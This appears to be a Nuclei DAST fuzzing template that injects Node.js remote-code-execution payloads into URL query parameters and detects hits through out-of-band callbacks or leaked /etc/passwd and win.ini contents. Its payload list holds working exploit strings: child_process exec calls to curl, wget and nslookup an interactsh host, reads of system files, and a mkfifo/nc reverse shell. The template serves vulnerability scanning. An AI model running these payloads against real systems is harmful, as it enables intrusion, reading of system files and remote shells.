http:
- fuzzing:
  - fuzz:
    - '{{injection}}'
    mode: multiple
    part: query
    type: replace
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
    - dns
  - part: body
    type: word
    words:
    - root:x:0:0
  - part: body
    type: word
    words:
    - bit app support
    - '[fonts]'
    - '[extensions]'
    - '[mci extensions]'
  matchers-condition: or
  method: GET
  path:
  - '{{BaseURL}}'
  payloads:
    injection:
    - require('child_process').exec('nslookup {{interactsh-url}}')
    - require('child_process').exec('cat /etc/passwd');{src:/bin/sh/}
    - require('child_process').exec('cat${IFS}/etc/passwd');{src:/bin/sh/}
    - ;require('child_process').exec('cat${IFS}/etc/passwd');{src:/bin/sh/}
    - require('child_process').exec('curl http://{{interactsh-url}}')
    - require('child_process').exec('wget http://{{interactsh-url}}')
    - var fs=require('fs');fs.readFileSync('/etc/passwd').toString('utf8')
    - <img src=x onerror=require(`child_process`).execSync(`nslookup {{interactsh-url}}`)
    - var fs=require('fs');fs.readFileSync('C:/Windows/win.ini').toString('utf8')
    - var fs=require('fs');fs.readFileSync('C:\Windows\win.ini').toString('utf8')
    - require('child_process').exec('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh
      -i 2>&1|nc {{interactsh-url}} 443 >/tmp/f')
    - require('child_process').exec('curl '{{interactsh-url}}'')
    - require('child_process').exec('wget '{{interactsh-url}}'')
    - require('child_process').exec('nslookup {{interactsh-url}}')
  stop-at-first-match: true
id: nodejs-rce-param-fuzzer
info:
  author: reewardius
  name: NodeJS RCE via Param Fuzzer
  severity: critical
  tags: fuzzing-rce,fuzzing-req,dast
